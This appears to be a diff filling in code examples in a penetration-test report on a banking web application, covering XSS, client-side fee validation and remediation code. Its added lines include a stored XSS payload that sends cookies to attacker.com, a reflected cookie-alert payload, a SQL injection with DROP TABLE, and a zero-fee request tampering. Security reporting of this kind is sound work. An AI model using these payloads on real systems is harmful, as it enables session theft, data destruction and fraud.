@@ -310,8 +310,11 @@ SELECT * FROM transactions WHERE account_nickname = 'My Savings'; DROP TABLE tra
 
 The application reflected user input in error messages without proper encoding:
 
-```
+```html
+GET /api/v1/users/search?name=<script>alert(document.cookie)</script>
 
+# Response HTML included unescaped input
+<div class="error">No results found for: <script>alert(document.cookie)</script></div>
 ```
 
 **Stored XSS in User Profiles:**
@@ -319,7 +322,10 @@ The application reflected user input in error messages without proper encoding:
 Profile "bio" fields allowed HTML without sanitization:
 
 ```javascript
-
+POST /api/v1/users/profile
+{
+  "bio": "<img src=x onerror='fetch(`https://attacker.com?cookie=${document.cookie}`)'/>"
+}
 ```
 
 When other users viewed the profile, the malicious script executed in their context.
@@ -339,13 +345,36 @@ Source map analysis revealed interesting business logic on the client side:
 **Finding: Sensitive Logic in Client-Side Code**
 
 ```javascript
+// Found in bundle.js.map
+function calculateTransactionFee(amount) {
+  if (amount < 1000) return 0;  // No fee under $1,000
+  if (amount < 10000) return amount * 0.01;  // 1% fee
+  return amount * 0.005;  // 0.5% fee for large transfers
+}
 
+// Fee validation only happened client-side
 ```
 
 **Exploitation:** By intercepting and modifying API requests, we could bypass fee calculations entirely:
 
 ```javascript
+// Original request
+POST /api/v1/transactions/transfer
+{
+  "amount": 50000,
+  "fee": 250,  // Correctly calculated
+  "recipient": "12345"
+}
 
+// Modified request
+POST /api/v1/transactions/transfer
+{
+  "amount": 50000,
+  "fee": 0,  // Zero fee submitted
+  "recipient": "12345"
+}
+
+// Server accepted without validation
 ```
 
 **Business Impact:** Direct revenue loss through fee bypass. Over a month of testing, this could have resulted in tens of thousands in missed fees. Additionally demonstrates lack of server-side validation for financial calculations.
@@ -389,20 +418,26 @@ The most dangerous aspect of these findings was how they could be chained:
 3. **Implement Object-Level Authorization**
 
 ```javascript
-// Decoded JWT header
-{
-  "alg": "HS256",
-  "typ": "JWT"
-}
+// Before
+app.get('/api/v1/users/:id', async (req, res) => {
+  const user = await User.findById(req.params.id);
+  res.json(user);
+});
 
-// Decoded payload
-{
-  "userId": "12345",
-  "email": "user@example.com",
-  "role": "customer",
-  "iat": 1700000000,
-  "exp": 1700086400
-}
+// After
+app.get('/api/v1/users/:id', authenticate, async (req, res) => {
+  const requestedId = req.params.id;
+  const authenticatedUserId = req.user.id;
+  const isAdmin = req.user.role === 'admin';
+  
+  // Users can only access their own data, admins can access any
+  if (requestedId !== authenticatedUserId && !isAdmin) {
+    return res.status(403).json({ error: 'Forbidden' });
+  }
+  
+  const user = await User.findById(requestedId);
+  res.json(user);
+});
 ```
 
 ### Short-term Actions (1-2 weeks)
@@ -415,7 +450,10 @@ The most dangerous aspect of these findings was how they could be chained:
 5. **Implement Content Security Policy**
 
 ```
-
+Content-Security-Policy: default-src 'self'; 
+  script-src 'self' 'nonce-{random}'; 
+  style-src 'self' 'nonce-{random}'; 
+  img-src 'self' data: https:;
 ```
 
 6. **Server-Side Business Logic Validation**
